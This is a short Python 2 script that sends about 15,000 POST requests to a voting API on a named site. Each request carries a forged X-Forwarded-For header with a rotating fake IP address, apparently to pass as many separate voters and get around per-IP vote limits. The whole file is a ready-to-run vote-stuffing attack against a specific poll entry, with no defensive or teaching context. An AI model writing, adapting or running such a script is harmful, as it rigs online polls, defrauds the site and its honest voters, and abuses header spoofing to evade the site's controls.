#!/usr/bin/env python
#coding=utf8
 
import httplib, urllib
 
httpClient = None

for x in range(35,50):
    idx = 0
    tip = 1
    for num in range(0,1000):
        if(idx%5==0):
            tip = tip + 1
        idx = idx + 1 
        print idx 
        try:
            params = urllib.urlencode({})
            headers = {"Content-type": "application/json"
                            , "X-Forwarded-For": "117.120."+str(x)+"." + str(tip)}
         
            httpClient = httplib.HTTPConnection("vote.zaoanshenghuo.com", 80, timeout=30)
            httpClient.request("POST", "/api/vote/56833952eb715c4c05a0b935", params, headers)
         
            response = httpClient.getresponse()
            #print response.status
            print response.read()
            #print response.getheaders() #获取头信息
        except Exception, e:
            print e
        finally:
            if httpClient:
                httpClient.close()
